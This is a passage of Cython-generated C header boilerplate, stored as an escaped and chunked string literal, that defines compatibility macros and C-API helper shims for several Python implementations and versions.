CYTHON_USE_PYTYPE_LOOKUP 0\\\\n  #if PY_VERSION_HEX < 0x03050000\\\\n    #undef CYTHON_USE_ASYNC_SLOTS\\\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\\\n  #undef CYTHON_USE_UNICODE_INTERNALS\\\\n  #define CYTHON_USE_UNICODE_INTERNALS 0\\\\n  #undef CYTHON_USE_UNICODE_WRITER\\\\n  #define CYTHON_USE_UNICODE_WRITER 0\\\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\\\n  #undef CYTHON_AVOID_BORROWED_REFS\\\\n  #define CYTHON_AVOID_BORROWED_REFS 1\\\\n  #undef CYTHON_ASSUME_SAFE_MACROS\\\\n  #define CYTHON_ASSUME_SAFE_MACROS 0\\\\n  #undef CYTHON_UNPACK_METHODS\\\\n  #define CYTHON_UNPACK_METHODS 0\\\\n  #undef CYTHON_FAST_THREAD_STATE\\\\n  #de""fine CYTHON_FAST_THREAD_STATE 0\\\\n  #undef CYTHON_FAST_PYCALL\\\\n  #define CYTHON_FAST_PYCALL 0\\\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\\\n  #undef CYTHON_USE_TP_FINALIZE\\\\n  #define CYTHON_USE_TP_FINALIZE 0\\\\n  #undef CYTHON_USE_DICT_VERSIONS\\\\n  #define CYTHON_USE_DICT_VERSIONS 0\\\\n  #undef CYTHON_USE_EXC_INFO_STACK\\\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\\\n  #ifndef CYTH\\\"\\\"ON_UPDATE_DESCRIPTOR_DOC\\\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\\\n  #endif\\\\n#elif defined(PYSTON_VERSION)\\\\n  #define CYTHON_COMPILING_IN_PYPY 0\\\\n  #define CYTHON_COMPILING_IN_PYSTON 1\\\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\\\n    #define CYTHON_USE_TYPE_SLOTS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\\\n  #undef CYTHON_USE_ASYNC_SLOTS\\\\n  #define CYTHON_USE_ASYNC_SL\"\"OTS 0\\\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_UNICODE_WRITER\\\\n  #define CYTHON_USE_UNICODE_WRITER 0\\\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\\\n  #endif\\\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\\\n  #endif\\\\n  #ifndef CYTHON_UNPACK_METHODS\\\\n    #define CYTHON_UNPACK_METHODS 1\\\\n  #endif\\\\n  #undef CYTHON_FAST_THREAD_STATE\\\\n  #define CYTHON_FAST_THREAD_STATE 0\\\\n  #undef CYTHON_FAST_PYCALL\\\\n  #define CYTHON_FAST_PYCALL 0\\\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\\\n  #undef CYTHON_USE_TP_FINALIZE\\\\n  #define CYTHON_USE_TP_FINALIZE 0\\\\n  #undef CYTHON_USE_DICT_VERSIONS\\\\n  #define CYTHON_USE""_DICT_VERSIONS 0\\\\n  #undef CYTHON_USE_EXC_INFO_STACK\\\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\\\n  #endif\\\\n#elif defined(PY_NOGIL)\\\\n  #define CYTHON_COMPILING_IN_PYPY 0\\\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\\\n  #define CYTHON_COMPILING_IN_NOGIL 1\\\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\\\n    #define CYTHON_USE_TYPE_SLOTS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\\\n  #ifndef CYTHON_USE_ASYNC_SLOTS\\\\n    #define CYTHON_USE_A\\\"\\\"SYNC_SLOTS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\\\n  #endif\\\\n  #undef CYTHON_USE_UNICODE_WRITER\\\\n  #define CYTHON_USE_UNICODE_WRITER 0\\\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\\\n    #define CYTHON_AVOID_BORROWED_\"\"REFS 0\\\\n  #endif\\\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\\\n  #endif\\\\n  #ifndef CYTHON_UNPACK_METHODS\\\\n    #define CYTHON_UNPACK_METHODS 1\\\\n  #endif\\\\n  #undef CYTHON_FAST_THREAD_STATE\\\\n  #define CYTHON_FAST_THREAD_STATE 0\\\\n  #undef CYTHON_FAST_PYCALL\\\\n  #define CYTHON_FAST_PYCALL 0\\\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\\\\n  #endif\\\\n  #ifndef CYTHON_USE_TP_FINALIZE\\\\n    #define CYTHON_USE_TP_FINALIZE 1\\\\n  #endif\\\\n  #undef CYTHON_USE_DICT_VERSIONS\\\\n  #define CYTHON_USE_DICT_VERSIONS 0\\\\n  #undef CYTHON_USE_EXC_INFO_STACK\\\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\\\n#else\\\\n  #define CYTHON_COMPILING_IN_PYPY 0\\\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\\\n  #define CYTHON_COMPILING_IN_CPYTHON 1\\\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\\\n  #""ifndef CYTHON_USE_TYPE_SLOTS\\\\n    #define CYTHON_USE_TYPE_SLOTS 1\\\\n  #endif\\\\n  #if PY_VERSION_HEX < 0x02070000\\\\n    #undef CYTHON_USE_PYTYPE_LOOKUP\\\\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\\\\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\\\\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\\\\n  #endif\\\\n  #if PY_MAJOR_VERSION < 3\\\\n    #undef CYTHON_USE_ASYNC_SLOTS\\\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\\\n  #endif\\\\n  #if PY_VERSION_HEX < 0x02070000\\\\n    #undef CYTHON_USE_PYLONG_INTERNALS\\\\n    #define CYTHON_USE_PYLONG_INTERNALS 0\\\\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\\\\n    #define CYTHON_USE_PYLONG_INTERNALS 1\\\\n  #endif\\\\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\\\\n    #define CYTHON_USE_PYLIST_\\\"\\\"INTERNALS 1\\\\n  #endif\\\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\\\n  #endif\\\\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\\\\n    #undef CYTHON_USE_UNICODE_WRITER\\\\n    #define CYTHON_USE_UNICODE_WRITER 0\\\\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\\\\n    #define CYTHON_USE_UNICODE_WRITER 1\\\\n  #endif\"\"\\\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\\\n  #endif\\\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\\\n  #endif\\\\n  #ifndef CYTHON_UNPACK_METHODS\\\\n    #define CYTHON_UNPACK_METHODS 1\\\\n  #endif\\\\n  #if PY_VERSION_HEX >= 0x030B00A4\\\\n    #undef CYTHON_FAST_THREAD_STATE\\\\n    #define CYTHON_FAST_THREAD_STATE 0\\\\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\\\\n    #define CYTHON_FAST_THREAD_STATE 1\\\\n  #endif\\\\n  #ifndef CYTHON_FAST_PYCALL\\\\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\\\\n  #endif\\\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\\\\n  #endif\\\\n  #ifndef CY""THON_USE_TP_FINALIZE\\\\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\\\\n  #endif\\\\n  #ifndef CYTHON_USE_DICT_VERSIONS\\\\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\\\\n  #endif\\\\n  #if PY_VERSION_HEX >= 0x030B00A4\\\\n    #undef CYTHON_USE_EXC_INFO_STACK\\\\n    #define CYTHON_USE_EXC_INFO_STACK 0\\\\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\\\\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\\\\n  #endif\\\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\\\\n  #endif\\\\n#endif\\\\n#if !defined(CYTHON_FAST_PYCCALL)\\\\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\\\\n#endif\\\\n#if CYTHON_USE_PYLONG_INTERNALS\\\\n  #if PY_MAJOR_VERSION < 3\\\\n    #include \\\\\\\"longintrepr.h\\\\\\\"\\\\n  #endif\\\\n  #undef SHIFT\\\\n  #undef BASE\\\\n  #undef MASK\\\\n  #ifdef SIZEOF_VOID_P\\\\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) \\\"\\\"};\\\\n  #endif\\\\n#endif\\\\n#ifndef __has_attribute\\\\n  #define __has_attribute(x) 0\\\\n#endif\\\\n#ifndef __has_cpp_attribute\\\\n  #define __has_cpp_attribute(x) 0\\\\n#endif\\\\n#ifndef CYTHON_RESTRICT\\\\n  #if defined(__GNUC__)\\\\n    #define CYTHON_RESTRICT __restrict__\\\\n  #elif defined(_MSC_VER) && _MSC_VE\"\"R >= 1400\\\\n    #define CYTHON_RESTRICT __restrict\\\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\\\n    #define CYTHON_RESTRICT restrict\\\\n  #else\\\\n    #define CYTHON_RESTRICT\\\\n  #endif\\\\n#endif\\\\n#ifndef CYTHON_UNUSED\\\\n# if defined(__GNUC__)\\\\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\\\\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\\\\n#   else\\\\n#     define CYTHON_UNUSED\\\\n#   endif\\\\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\\\\n#   define CYTHON_UNUSED __attribute__ ((__unused__))""\\\\n# else\\\\n#   define CYTHON_UNUSED\\\\n# endif\\\\n#endif\\\\n#ifndef CYTHON_MAYBE_UNUSED_VAR\\\\n#  if defined(__cplusplus)\\\\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\\\\n#  else\\\\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\\\\n#  endif\\\\n#endif\\\\n#ifndef CYTHON_NCP_UNUSED\\\\n# if CYTHON_COMPILING_IN_CPYTHON\\\\n#  define CYTHON_NCP_UNUSED\\\\n# else\\\\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\\\\n# endif\\\\n#endif\\\\n#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\\\\n#ifdef _MSC_VER\\\\n    #ifndef _MSC_STDINT_H_\\\\n        #if _MSC_VER < 1300\\\\n           typedef unsigned char     uint8_t;\\\\n           typedef unsigned int      uint32_t;\\\\n        #else\\\\n           typedef unsigned __int8   uint8_t;\\\\n           typedef unsigned __int32  uint32_t;\\\\n        #endif\\\\n    #endif\\\\n#else\\\\n   #include <stdint.h>\\\\n#endif\\\\n#ifndef CYTHON_FALLTHROUGH\\\\n  #if defined(__cplusplus) && __cplusplus >= 201103L\\\\n    #if __has_cpp_attribute(fallthrough)\\\\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\\\\n    #elif __has_cpp_attribute(clang::fallthrough)\\\\n      #define CYTHON_FALLTHROUGH [[clang::fal\\\"\\\"lthrough]]\\\\n    #elif __has_cpp_attribute(gnu::fallthrough)\\\\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\\\\n    #endif\\\\n  #endif\\\\n  #ifndef CYTHON_FALLTHROUGH\\\\n    #if __has_attribute(fallthrough)\\\\n      #define CYT\"\"HON_FALLTHROUGH __attribute__((fallthrough))\\\\n    #else\\\\n      #define CYTHON_FALLTHROUGH\\\\n    #endif\\\\n  #endif\\\\n  #if defined(__clang__ ) && defined(__apple_build_version__)\\\\n    #if __apple_build_version__ < 7000000\\\\n      #undef  CYTHON_FALLTHROUGH\\\\n      #define CYTHON_FALLTHROUGH\\\\n    #endif\\\\n  #endif\\\\n#endif\\\\n\\\\n#ifndef CYTHON_INLINE\\\\n  #if defined(__clang__)\\\\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\\\\n  #elif defined(__GNU""C__)\\\\n    #define CYTHON_INLINE __inline__\\\\n  #elif defined(_MSC_VER)\\\\n    #define CYTHON_INLINE __inline\\\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\\\n    #define CYTHON_INLINE inline\\\\n  #else\\\\n    #define CYTHON_INLINE\\\\n  #endif\\\\n#endif\\\\n\\\\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\\\\n  #define Py_OptimizeFlag 0\\\\n#endif\\\\n#define __PYX_BUILD_PY_SSIZE_T \\\\\\\"n\\\\\\\"\\\\n#define CYTHON_FORMAT_SSIZE_T \\\\\\\"z\\\\\\\"\\\\n#if PY_MAJOR_VERSION < 3\\\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\\\\\"__builtin__\\\\\\\"\\\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\\\\\\\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\n  #define __Pyx_DefaultClassType PyClass_Type\\\\n#else\\\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\\\\\"builtins\\\\\\\"\\\\n  #define __Pyx_DefaultClassType PyType_Type\\\\n#if PY_VERSION_HEX >= 0x030B00A1\\\\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\\\\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\\\\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\\\\n                                                    PyObject *name, int fline, PyObject *lnos) {\\\\n        PyObject *kw\\\"\\\"ds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\\\\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_r\"\"esult=NULL, *empty=NULL;\\\\n        const char *fn_cstr=NULL;\\\\n        const char *name_cstr=NULL;\\\\n        PyCodeObject* co=NULL;\\\\n        PyObject *type, *value, *traceback;\\\\n        PyErr_Fetch(&type, &value, &traceback);\\\\n        if (!(kwds=PyDict_New())) goto end;\\\\n        if (!(argcount=PyLong_FromLong(a))) goto end;\\\\n        if (PyDict_S""etItemString(kwds, \\\\\\\"co_argcount\\\\\\\", argcount) != 0) goto end;\\\\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_posonlyargcount\\\\\\\", posonlyargcount) != 0) goto end;\\\\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_kwonlyargcount\\\\\\\", kwonlyargcount) != 0) goto end;\\\\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_nlocals\\\\\\\", nlocals) != 0) goto end;\\\\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_stacksize\\\\\\\", stacksize) != 0) goto end;\\\\n        if (!(flags=PyLong_FromLong(f))) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_flags\\\\\\\", flags) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_code\\\\\\\", code) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_consts\\\\\\\", c) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_names\\\\\\\", n) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_varnames\\\\\\\", v) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_freevars\\\\\\\", fv) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_cellvars\\\\\\\", cell) != 0) goto end;\\\\n        if (PyDict_SetItemString(kwds, \\\\\\\"co_linetable\\\\\\\", lnos) != 0) goto end;\\\\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\\\\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\\\\n        if (!(co = PyCode_NewEmpty(fn_cstr\\\"\\\", name_cstr, fline))) goto end;\\\\n        if (!(replace = PyObject_GetA\"\"ttrString((PyObject*)co, \\\\\\\"replace\\\\\\\"))) goto cleanup_code_too;\\\\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here""\\\\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\\\\n        Py_XDECREF((PyObject*)co);\\\\n        co = (PyCodeObject*)call_result;\\\\n        call_result = NULL;\\\\n        if (0) {\\\\n            cleanup_code_too:\\\\n            Py_XDECREF((PyObject*)co);\\\\n            co = NULL;\\\\n        }\\\\n        end:\\\\n        Py_XDECREF(kwds);\\\\n        Py_XDECREF(argcount);\\\\n        Py_XDECREF(posonlyargcount);\\\\n        Py_XDECREF(kwonlyargcount);\\\\n        Py_XDECREF(nlocals);\\\\n        Py_XDECREF(stacksize);\\\\n        Py_XDECREF(replace);\\\\n        Py_XDECREF(call_result);\\\\n        Py_XDECREF(empty);\\\\n        if (type) {\\\\n            PyErr_Restore(type, value, traceback);\\\\n        }\\\\n        return co;\\\\n    }\\\\n#else\\\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\\\\\\\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\n#endif\\\\n  #define __Pyx_DefaultClassType PyType_Type\\\\n#endif\\\\n#ifndef Py_TPFLAGS_CHECKTYPES\\\\n  #define Py_TPFLAGS_CHECKTYPES 0\\\\n#endif\\\\n#ifndef Py_TPFLAGS_HAVE_INDEX\\\\n  #define Py_TPFLAGS_HAVE_INDEX 0\\\\n#endif\\\\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\\\\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\\\\n#endif\\\\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\\\\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\\\\n#endif\\\\n#ifndef METH_STACKLESS\\\\n  #define METH_STACKLESS 0\\\\n#endif\\\\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\\\\n  #ifndef METH_FASTCALL\\\\n     #define METH_FASTCALL 0x80\\\\n  #endif\\\\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\\\\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\\\\n                                                          Py_ssiz\\\"\\\"e_t nar\"\"gs, PyObject *kwnames);\\\\n#else\\\\n  #define __Pyx_PyCFunctionFast ""_PyCFunctionFast\\\\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\\\\n#endif\\\\n#if CYTHON_FAST_PYCCALL\\\\n#define __Pyx_PyFastCFunction_Check(func)\\\\\\\\\\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\\\\n#else\\\\n#define __Pyx_PyFastCFunction_Check(func) 0\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\\\\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\\\\n  #define PyObject_Free(p)     PyMem_Free(p)\\\\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\\\\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\\\\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\\\\n  #define PyMem_RawFree(p)             PyMem_Free(p)\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYSTON\\\\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\\\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\\\\n#else\\\\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\\\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\\\\n#endif\\\\n#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000\\\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\\\n#elif PY_VERSION_HEX >= 0x03060000\\\\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\\\\n#elif PY_VERSION_HEX >= 0x03000000\\\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\\\n#else\\\\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\\\\n#endif\\\\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\\\\n#include \\\\\\\"pythread.h\\\\\\\"\\\\n#define Py_tss_NEEDS_INIT 0\\\\ntypedef int Py_tss_t;\\\\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\\\\n  *key = PyThread_create_ke""y();\\\\n  return 0;\\\\n}\"\"\\\\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_\\\"\\\"alloc(void) {\\\\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\\\\n  *key = Py_tss_NEEDS_INIT;\\\\n  return key;\\\\n}\\\\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\\\\n  PyObject_Free(key);\\\\n}\\\\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\\\\n  return *key != Py_tss_NEEDS_INIT;\\\\n}\\\\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\\\\n  PyThread_delete_key(*key);\\\\n  *key = Py_tss_NEEDS_INIT;\\\\n}\\\\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\\\\n  return PyThread_set_key_value(*key, value);\\\\n}\\\\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\\\\n  return PyThread_get_key_value(*key);\\\\n}\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\\\\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\\\\n#else\\\\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\\\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\\\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\\\\n#else\\\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\\\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\\\\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\\\\n#else\\\\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\\\\n#endif\\\\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\\\\n  #define CYTHON_PEP393_ENABLED 1\\\\n  #if PY_VERSION_HEX >= 0x030C0000\\\\n    #define __Pyx_PyUnicode_READY(op)       (0)\\\\n  #else\\\\n    #define __Pyx_PyUnicod""e_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\\\\\\\\\\n                                                0 : _PyUnicode_Rea\"\"dy((PyObject *)(op)))\\\\n  #endif\\\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\\\"\\\"\\\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\\\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\\\\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\\\\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\\\\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\\\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\\\\n  #if PY_VERSION_HEX >= 0x030C0000\\\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\\\\n  #else\\\\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\\\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\\\\n    #else\\\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\\\\n    #endif\\\\n  #endif\\\\n#else\\\\n  #define CYTHON_PEP393_ENABLED 0\\\\n  #define PyUnicode_1BYTE_KIND  1\\\\n  #define PyUnicode_2BYTE_KIND  2\\\\n  #define PyUnicode_4BYTE_KIND  4\\\\n  #define __Pyx_PyUnicode_READY(op)       (0)\\\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\\\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\\\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\\\\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\\\\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\\\\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\\\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = c""h)\\\\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != 